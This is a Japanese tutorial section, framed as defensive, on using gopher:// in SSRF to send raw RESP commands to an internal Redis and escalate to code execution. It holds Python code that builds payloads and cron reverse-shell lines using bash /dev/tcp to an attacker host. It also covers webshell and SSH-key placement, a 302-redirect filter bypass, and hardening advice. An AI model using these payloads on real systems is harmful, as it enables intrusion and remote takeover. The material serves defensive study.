## gopherによるプロトコルスマグリングとRedis→RCE

> 本節は防御目的の解説です。ここで扱う技法は「なぜ内部サービスが乗っ取られるのか」を仕組みレベルで理解し、自組織を守るために書いています。実在サービスや本番環境への無許可の検証、破壊的操作は行わないでください。攻撃コードはすべて、あなたが管理権限を持つ隔離ラボ（ローカルのDocker等）でのみ再現してください。

SSRF（Server-Side Request Forgery＝サーバに攻撃者の意図した宛先へリクエストを送らせる脆弱性）の「怖さ」の大半は、それ単体ではなく **プロトコルスマグリング** によって生まれます。プロトコルスマグリングとは、「HTTPを取りに行くつもりのクライアント」に、別プロトコル（Redis, MySQL, SMTP など）の生バイト列を代わりに喋らせてしまう技術です。その主役が `gopher://` スキームです。

本節では、なぜ `gopher://` が「任意のTCPバイト列を内部サービスへ流し込むトンネル」になるのか、Redisをどう悪用してSSRFをRCE（Remote Code Execution＝遠隔任意コード実行）へ昇格させるのか、そしてなぜ302リダイレクトがフィルタを突破できてしまうのかを、原理から解説します。

---

### なぜ gopher:// が「万能TCPトンネル」になるのか

#### gopherプロトコルの素朴な仕様

gopherは1991年に作られた、HTTPより古い文書検索・配信プロトコルです。RFC 1436で定義され、TCP上でごく単純に動きます。クライアントは接続後、「セレクタ文字列」を送り、末尾に `CRLF`（`\r\n`＝キャリッジリターン+ラインフィード）を付けるだけ。サーバはそれに応じたテキストを返します。HTTPのような「メソッド・ヘッダ・ホスト名」といった構造を一切要求しません。

この「構造がない」という点が、攻撃者にとっては決定的です。URLの構造は次のようになっています。

```
gopher://<host>:<port>/<gopher-type><selector>
```

- `<gopher-type>` はアイテム種別を表す1文字（例: `0`=テキスト、`1`=ディレクトリ）。SSRF悪用では慣習的に `_`（無意味な1文字）を置きます。パーサはこの1文字を「種別」として読み飛ばすため、その **後ろに続く文字列がそのままソケットへ送られる本体（selector）** になります。
- `<selector>` に入れた文字列は、URLデコードされたうえで、`<host>:<port>` へ確立したTCP接続に **ほぼ生のまま流し込まれます**。

つまり `gopher://127.0.0.1:6379/_XXXX` を取得させると、「127.0.0.1 の 6379番ポートへTCP接続し、`XXXX`（URLデコード後）を送信する」という動作になります。ここで `XXXX` に改行を含む任意のバイト列を仕込めるため、Redisでも SMTP でも MySQL でも、そのプロトコルの生コマンドを丸ごと注入できます。これがプロトコルスマグリングです。

#### HTTPスキームとの決定的な差

同じSSRFでも `http://` スキームでは、クライアント（curl・libcurl・言語のHTTPライブラリ）が必ず `GET /... HTTP/1.1\r\nHost: ...\r\n\r\n` という **HTTPリクエストの体裁** を組み立てて送ります。攻撃者はメソッドやパスに文字列を混ぜ込めても、行頭に任意のバイトを置く自由や、接続冒頭から好きなバイトを送る自由がありません。多くのプロトコル（特にRESPのようにバイナリ寄りのもの）は、先頭に `GET ` という不要な文字列が付くだけで解釈に失敗します。

一方 `gopher://` は、接続を開いた直後から **改行を含む任意のバイト列を、余計なプレフィックスなしで** 送れます。HackTricks の SSRF 解説でも「gopherはHTTPのようにリクエスト構造に縛られず、サーバに任意の生バイトを任意のTCPポートへ送らせられるため、最も強力なSSRFエスカレーション手段の一つ」と位置づけられています。

> ⚠️ **未取得の資料**: 「HackTricks — SSRF (Server Side Request Forgery)」は自動取得できませんでした（理由: 元URLが `tollbit.hacktricks.wiki` へ302リダイレクトし、そのミラーが HTTP 402 Payment Required を返したため）。以下のURLからご自身で直接ご覧ください: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
>
> （以下は未取得資料の補足として一般知識に基づく解説です）HackTricks の当該ページには、本節で扱う各プロトコル（Redis / FastCGI / SMTP / MySQL / Memcached）向けの `gopher://` ペイロード雛形と、`%0d%0a` によるCRLFエンコード例、`Gopherus` の利用例がリファレンスとしてまとまっています。個々のペイロードは後述の原理どおりに構成されています。
>
> 出典: HackTricks — SSRF (Server-Side Request Forgery) — https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

#### 前提条件（gopherが使える条件）

gopherスマグリングが成立するには、SSRFを起こすフェッチ実装が `gopher://` を **サポートしていること** が必要です。

- **libcurl / PHPの `curl` 系** は歴史的に gopher をサポートします（`--enable-gopher` ビルド時）。SSRFがcurlベースなら成功率が高い。
- **多くの言語標準HTTPクライアント**（Python `requests`、Java `URL`/`HttpClient`、Go `net/http` など）は gopher を扱いません。この場合はgopher単独では通りません。
- ただし後述するように、標準クライアントでも **HTTPリクエストを出した先が `Location: gopher://...` の302を返すと、curlバックエンドや一部ライブラリはリダイレクト先としてgopherへ飛ぶ** ため、フィルタ回避と同時にgopherを「後付け」で通せる場合があります。

---

### Redisはなぜ「ファイル書き込み→RCE」に化けるのか

#### Redisの通信プロトコル（RESP）

Redis は 6379/TCP で **RESP（REdis Serialization Protocol）** という単純なテキストプロトコルを話します。RESPでは、コマンドは「配列」として次の形で表現されます。

```
*<引数の個数>\r\n
$<第1引数のバイト長>\r\n
<第1引数>\r\n
$<第2引数のバイト長>\r\n
<第2引数>\r\n
...
```

例えば `SET 1 hello` は次のようになります。

```
*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$5\r\nhello\r\n
```

- `*3` は「3引数のコマンド」、`$3` は「次の引数は3バイト（`SET`）」を意味します。
- Redis は **改行区切りの単純なテキスト**（inlineコマンドと呼ばれる `SET 1 hello\r\n` 形式）も受理します。そのためgopherで注入しやすい。
- 重要なのは、**認証なし（`requirepass` 未設定）のRedisは、接続してきた相手を無条件に信頼する** という設計思想です。「内部ネットワークからしか触れない」という前提で長年運用されてきたため、localhostのRedisは丸腰なことが非常に多いのです。

このRESPの単純さと無認証という前提が、gopherと組み合わさった瞬間に凶器になります。gopherの selector に上記のRESPバイト列（`\r\n` を `%0d%0a` としてURLエンコード）を詰めれば、SSRF経由でRedisに任意コマンドを実行させられます。

#### CONFIG SET が「任意ファイル書き込み」になる仕組み

RedisはデータをRDBファイルとしてディスクに保存できます。ここで悪用されるのが次の2つの設定コマンドです。

- `CONFIG SET dir <ディレクトリ>` … RDBの保存先ディレクトリを変更する
- `CONFIG SET dbfilename <ファイル名>` … RDBのファイル名を変更する
- `SAVE` … 現在のデータを `<dir>/<dbfilename>` に **同期的に書き出す**

通常RDBは `dump.rdb` としてデータディレクトリに書かれますが、`dir` と `dbfilename` を攻撃者が指定できるということは、**Redisプロセスの権限で任意パスに任意内容のファイルを書ける** ことを意味します。しかもRDBファイルには、事前に `SET` したキーの値がそのまま埋め込まれます。したがって、

1. `SET` で「実行させたい内容」をキーの値として書き込む
2. `CONFIG SET dir` / `CONFIG SET dbfilename` で書き込み先を狙ったパスへ変更
3. `SAVE` でそのパスにファイルを吐かせる

という3段構えで、任意ファイルを設置できます。RDBファイルにはRedis独自のヘッダやチェックサムが前後に付きますが、cron や SSH の `authorized_keys` は **行頭・行末のゴミを無視して有効な行だけを解釈する** ため、値の前後に改行 `\n\n` を入れておけば有効行だけがきちんと効きます。ここが「バイナリRDBの中に平文の設定を紛れ込ませても動く」理由です。

#### RCEへの3つの定番ルート

書けるファイルパスと権限に応じて、代表的に3つの昇格ルートがあります（いずれも「Redisが特定の権限・環境で動いている」ことが前提であり、修正済み環境や権限分離された環境では成立しません）。

1. **cronジョブ書き込み（Linux）**
   `/var/spool/cron/`（RedHat系）や `/var/spool/cron/crontabs/`（Debian系）に、rootなどの権限で動くRedisがファイルを書ければ、cronが定期実行するコマンドを注入できます。典型的には次のようなリバースシェル行です。
   ```
   */1 * * * * bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1
   ```
   `/dev/tcp/host/port` は bash の擬似デバイスで、TCP接続を開きます。`>&` で標準入出力をそのソケットへ繋ぐことで、攻撃者側の `nc -lvnp <port>` に対話シェルが飛んできます。cronは書式に厳しく、行頭に不正な文字があると **その行を無視するだけ** なので、RDBのゴミが混ざっても該当行だけ有効化されます。

2. **SSH公開鍵書き込み**
   Redisが `/root/.ssh/`（またはユーザのホーム）に書ける場合、`authorized_keys` に攻撃者の公開鍵を追記すれば、以後パスワードなしでSSHログインできます。cronのようなタイミング待ちが不要で確実性が高い一方、SSHサーバが公開されている必要があります。

3. **Webシェル書き込み**
   Redisと同一ホストでPHP等のWebサーバが動き、そのドキュメントルート（例 `/var/www/html/`）にRedisが書ける場合、`<?php system($_GET['c']); ?>` のようなWebシェルを設置してHTTP経由でコマンド実行します。

いずれも「攻撃者が値を仕込む→保存先を変える→SAVEで吐かせる」という同じ骨格です。

> **防御メモ**: これらはすべて Redis の設計上の正当な機能（永続化・設定変更）を悪用しています。裏を返せば、`requirepass` の設定、`rename-command CONFIG ""` による危険コマンドの無効化、`protected-mode yes`、Redisを非rootの専用ユーザで動かす、6379をループバック/内部専用に閉じる、といった標準的なハードニングで大半が塞がります。詳細は後述します。

---

### 実際のペイロード構成（xmsec/redis-ssrf を題材に）

gopher×Redisのペイロードが実際にどう組み立てられるかは、オープンソースのジェネレータ [`xmsec/redis-ssrf`](https://github.com/xmsec/redis-ssrf) のコードを読むと原理がよく分かります。核心は、Redisコマンドを RESP へ整形する次の関数です。

```python
def redis_format(arr):
    CRLF = "\r\n"
    redis_arr = arr.split(" ")
    cmd = ""
    cmd += "*" + str(len(redis_arr))            # 引数の個数
    for x in redis_arr:
        cmd += CRLF + "$" + str(len(x)) + CRLF + x  # 各引数の長さ+本体
    cmd += CRLF
    return cmd
```

- 入力 `"set 1 hello"` をスペースで分割し、`*3\r\n$3\r\nset\r\n$1\r\n1\r\n$5\r\nhello\r\n` という **正しいRESP配列** を作ります。
- なぜRESP形式にするのか？ inlineコマンド（平文＋改行）でも動くことは多いのですが、値に空白・改行・特殊文字を含む場合、`$<長さ>` で「次は何バイト読む」と明示するRESPの方が確実にパースされるからです。cronの行やSSH鍵は空白・改行だらけなので、RESPが安定します。

cronリバースシェルの場合、ツールは概念的に次の一連のコマンドを組み立てます（`redis-ssrf` の `generate_reverse()` 相当）。

```python
filename = "root"
path     = "/var/spool/cron/"
shell    = "\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.1.1/2333 0>&1\n\n"

commands = [
    "flushall",                       # 既存データを消して汚染を避ける
    "set 1 {}".format(shell),         # 値としてcron行を格納（前後に\n\n）
    "config set dir " + path,         # 保存先ディレクトリ
    "config set dbfilename " + filename,  # 保存先ファイル名
    "save",                           # ディスクへ書き出し=cron設置
    "quit",
]
```

これらを1つずつ `redis_format()` でRESPにし、連結してから **URLエンコード** して、最終的に次の形の `gopher://` URLになります。

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset ... %04save%0D%0A
```

- `%0D%0A` は `\r\n`(CRLF) のURLエンコードです。**RESPは改行でトークンを区切るため、CRLFを正しく届けることが最重要** です。ここが崩れるとRedisはコマンド境界を見失います。
- `%2A` は `*`、`%24` は `$` のエンコードです。これらRESPのメタ文字がURL経路上で壊れないようにエンコードします。
- 実装によっては、いったんスペースを `^` などの目印文字に置換してから最後にスペースへ戻す、という小細工をします。これは中間処理（分割・整形）でスペースが意図せず消えたり分割境界になったりするのを防ぐための実装上の工夫であって、プロトコル上の要請ではありません。

> **ポイント（陳腐化対策）**: `xmsec/redis-ssrf` にはもう一つ、`CONFIG SET`/`SAVE` を使わず **Redis のマスター・スレーブ複製（replication）機能で悪意ある `.so` モジュールをロードさせてRCEする** モードもあります。こちらは Redis 4.x〜5.x の `MODULE LOAD` を悪用する手法で、**Redis 6以降での `protected-mode` 強化や 7系のモジュール制御、`CONFIG SET` の権限分離（ACL）** によって成立条件が変わっています。手元で検証する際は必ず対象のRedisバージョンと `redis.conf` の設定を確認してください。
>
> 出典: xmsec/redis-ssrf（redis ssrf gopher generator） — https://github.com/xmsec/redis-ssrf

---

### Gopherus — ワンコマンドでペイロードを吐くツール

手でRESPを組んでURLエンコードするのは間違いやすいため、実務（および学習）では [`tarunkant/Gopherus`](https://github.com/tarunkant/Gopherus) が定番です。Gopherus は各種内部サービス向けの `gopher://` ペイロードを対話的に生成するツールです。

#### 対応サービスとポート

| サービス | ポート | できること（悪用の主眼） |
|---|---|---|
| MySQL | 3306 | 認証なしMySQLへのクエリ発行、ファイル操作 |
| PostgreSQL | 5432 | 認証なしPostgreSQLへのアクセス |
| FastCGI | 9000 | PHPを介した任意コード実行（RCE） |
| Redis | 6379 | ファイル上書き・リバースシェル・PHPシェル設置 |
| Memcached | 11211 | Python/Ruby/PHPのデシリアライズ悪用 |
| Zabbix | 10050 | リモートコマンド実行 |
| SMTP | 25 | 被害者ユーザを騙ったメール送信（なりすまし） |

#### 使い方の骨格

```bash
# Redis向けのgopherペイロードを対話生成
gopherus --exploit redis
```

実行すると、ツールが「保存先パス」「実行したいコマンド（cron行など）」を聞いてきて、そのまま貼り付けられる `gopher://127.0.0.1:6379/_...` を出力します。あとはSSRFの「URLを入れる箇所」にこれを渡すだけ、という流れです。

Gopherusが便利な理由は、本節で説明した「RESP整形 → CRLFエンコード → gopher URL化」を **サービスごとの正しい作法で自動化** してくれる点にあります。逆に言えば、ツールが吐くURLの中身は、これまで説明した原理そのものです。ツールをブラックボックスにせず、出力されたURLを一度デコードして「何がRedisに送られるのか」を目で確認できるようになると、防御側としてログやWAFルールを設計する精度が上がります。

> **注記**: FastCGI（9000/TCP）向けペイロードも強力です。FastCGIは PHP-FPM が待ち受けるバイナリプロトコルで、`PHP_VALUE` に `auto_prepend_file` などを注入して任意PHPを実行させます。gopherならこのバイナリレコードも送り込めるため、「PHP-FPMがlocalhostで口を開けている」だけでRCEに繋がり得ます。原理はRedisと同じ「gopherで生バイトを流す」です。
>
> 出典: Gopherus（tarunkant/Gopherus, README） — https://github.com/tarunkant/Gopherus

---

### ケーススタディ1: SSRF→RCE via Redis using gopher（Zoningxtr）

> ⚠️ **未取得の資料**: 「SSRF to RCE via Redis using Gopher Protocol（Zoningxtr, Medium）」は自動取得できませんでした（理由: Medium が HTTP 403 Forbidden を返し、直接本文を取得できなかったため）。以下のURLからご自身で直接ご覧ください: https://medium.com/@zoningxtr/ssrf-to-rce-via-redis-using-gopher-protocol-7409b1d97dcd
>
> （以下は未取得資料の補足として、検索結果に現れた要旨と一般知識に基づく解説です）

この記事は、SSRFからRedis経由でRCEに至る流れを図解で追う入門記事として要旨が把握できました。攻撃の前提と手順は、これまで説明した原理どおりです。

- **前提条件**: 内部（127.0.0.1:6379）に **認証なしのRedis** が起動しており、SSRFのフェッチャがgopherを扱えること。
- **手順の骨子**:
  1. `FLUSHALL` で既存データを消し、RDBに余計な内容が混ざらないようにする。
  2. `SET` でリバースシェル用のcron行 `* * * * * bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1` を値として書き込む。
  3. `CONFIG SET dir /var/spool/cron/crontabs`（Debian系の例）と `CONFIG SET dbfilename ...` で保存先をcronディレクトリへ変更。
  4. `SAVE` でファイルを書き出し、cronが次の周期でリバースシェルを起動。
- **URLエンコードの要点**: RESPの `\r\n` を `%0d%0a` として届けること。ここを取り違えるとRedisがコマンド境界を認識できず失敗する、という実装上の落とし穴が強調されています。

要するにこの記事は、本節「Redisはなぜファイル書き込み→RCEに化けるのか」で述べた3段構え（値を仕込む→保存先を変える→SAVE）を、Redisのアーキテクチャ図とともに具体化したものです。

> 出典: Zoningxtr — SSRF to RCE via Redis using Gopher Protocol — https://medium.com/@zoningxtr/ssrf-to-rce-via-redis-using-gopher-protocol-7409b1d97dcd

---

### ケーススタディ2: Just Gopher It — 302でgopherを通した$15kのblind SSRF（SirLeeroyJenkins）

> ⚠️ **未取得の資料**: 「Just Gopher It: Escalating a Blind SSRF to RCE for $15k — Yahoo Mail（SirLeeroyJenkins, Medium）」は自動取得できませんでした（理由: Medium が HTTP 403 Forbidden を返したため）。以下のURLからご自身で直接ご覧ください: https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530
>
> （以下は未取得資料の補足として、検索結果に現れた要旨と一般知識に基づく解説です）

この記事は、Yahoo Mail に存在した **ブラインドSSRF**（レスポンスが返らず、成否が直接見えないSSRF）を RCE へ昇格させ、$15,000 の報奨を得た実例として知られています。本節の締めくくりにふさわしい「フィルタ突破」の教材です。要旨は次のとおりです。

#### なぜブラインドでも内部ポートが分かるのか

レスポンス本文が返らなくても、`gopher://127.0.0.1:<port>` を順に投げたときの **応答時間やエラーの差（オープン/クローズで接続挙動が変わる）** を観測すれば、内部でどのポートが開いているかを推定できます。これにより 6379（Redis）が開いていることを特定しています。これは「ブラインドでもサイドチャネルで情報が漏れる」典型例です。

#### 302リダイレクトによるgopherスマグリング（核心）

多くのSSRF対策は「ユーザが入力したURL」を検査します。ところが、検査を通過した無害そうなURL（例: 攻撃者サーバ上のエンドポイント）へアクセスさせ、そのサーバが次を返すとどうなるでしょうか。

```
HTTP/1.1 302 Found
Location: gopher://127.0.0.1:6379/_<RESP payload...>
```

- SSRF対策の多くは **最初のURL** しか検査しません。リダイレクト先URLを再検査しない実装だと、`Location` に仕込んだ `gopher://127.0.0.1:...` へフェッチャがそのまま飛んでしまいます。
- これにより、(a) **入力URLブロックリスト**（`127.0.0.1` や内部IPの拒否）を回避しつつ、(b) 本来 `http://` しか想定していなかった経路に **gopherを後付けで注入** できます。「フィルタ済みの内部IPに到達しRCEへ」という記事タイトルの流れは、この302トリックが要です。
- 成立条件は「フェッチャがリダイレクトを自動追従し、かつgopherスキームを追従先として実行すること」。libcurlベースの実装で特に問題になります。

#### 学ぶべき防御教訓

このケースの本質は「Redisが弱い」ことよりも、**SSRF対策が最初のホップしか見ていなかった** ことにあります。したがって防御は「リダイレクト先も含めて毎ホップ検証する」「gopher/file/dict等の危険スキームを許可リスト方式で排除する」に集約されます。

> 出典: SirLeeroyJenkins — Just Gopher It: Escalating a Blind SSRF to RCE for $15k — https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530

---

### 防御: プロトコルスマグリングを止める

攻撃の原理を裏返すと、多層防御の勘所が明確になります。**アプリ層・ネットワーク層・サービス層** の3段で塞ぐのが要点です。

#### アプリ層（SSRFフェッチャ側）

- **スキーム許可リスト**: `http`/`https` のみ許可し、`gopher` `dict` `file` `ftp` `ldap` `redis` などを明示拒否する。ブロックリストではなく **許可リスト** にする（新スキームの取りこぼしを防ぐ）。
- **リダイレクトの毎ホップ検証**: 302等の追従先URLも、最初のURLと同じ検査（スキーム・宛先IP）にかける。追従回数を制限し、可能なら自動追従を無効化して自前で検証する。
- **宛先IPの検証はDNS解決後に**: ホスト名を許可しても、DNSリバインディングで内部IPへ解決され得る。**名前解決した実IP** に対してプライベート/ループバック/リンクローカル/メタデータIP（169.254.169.254 等）を拒否する。
- **libcurlの設定**: `CURLOPT_PROTOCOLS`/`CURLOPT_REDIR_PROTOCOLS` を `HTTP|HTTPS` に限定し、gopher等を無効化する。

#### ネットワーク層

- 内部サービス（Redis/MySQL/PostgreSQL/FastCGI/Memcached）を **アプリサーバのlocalhostや到達可能な内部IPに無防備に晒さない**。egressをセグメント化し、アプリサーバからDB/キャッシュへの通信は必要な宛先・ポートのみに限定する。
- クラウドのメタデータエンドポイントは IMDSv2（トークン必須）へ移行する。

#### サービス層（Redisハードニング）

- `requirepass`（またはRedis 6+のACL）で **認証を必須** にする。無認証localhostという前提を捨てる。
- `protected-mode yes`（デフォルト有効）を維持する。
- `rename-command CONFIG ""` / `rename-command SAVE ""` / `rename-command FLUSHALL ""` / `rename-command MODULE ""` で危険コマンドを封じる。
- Redisを **非rootの専用ユーザ** で動かし、cronディレクトリやWebルート、`.ssh` へ書けないようにする（最小権限）。書き込み先が奪われても任意ファイル書き込みが致命傷にならない。
- 6379 を bind でループバックor内部専用に閉じ、ファイアウォールで隔離する。

これらは個別には当たり前のハードニングですが、**「アプリのSSRF対策が完璧でなくても、Redis側が固ければRCEに至らない」「Redisが緩くても、gopherが通らなければ到達できない」** という多層防御の考え方が重要です。攻撃チェーンはどこか1箇所を断てば崩れます。

---

### まとめ

- `gopher://` は **接続直後から任意の生バイト列（改行込み）を任意TCPポートへ送れる** ため、SSRFを「HTTPを取りに行くだけ」から「内部サービスに生コマンドを喋らせる」へと質的に変える。これがプロトコルスマグリングの核心。
- Redisは **RESPという単純なプロトコル** と **無認証localhostという運用前提**、そして `SET`→`CONFIG SET dir/dbfilename`→`SAVE` による **任意ファイル書き込み** の組み合わせで、gopher経由のcron/SSH鍵/Webシェル設置によりRCEへ昇格する。
- RESPの `\r\n` を `%0d%0a` として正確に届けることが成否を分ける。`Gopherus` や `xmsec/redis-ssrf` はこの整形を自動化するが、中身は本節の原理そのもの。
- 302リダイレクトは「最初のURLしか検査しないSSRF対策」を突破し、gopherを後付けで通す強力なテクニック（$15kのYahoo事例）。防御は **毎ホップ検証** と **スキーム許可リスト** が要。
- 防御はアプリ層（スキーム制限・リダイレクト検証・解決後IP検証）、ネットワーク層（内部サービスの隔離）、サービス層（Redis認証・危険コマンド無効化・最小権限）の多層で行う。
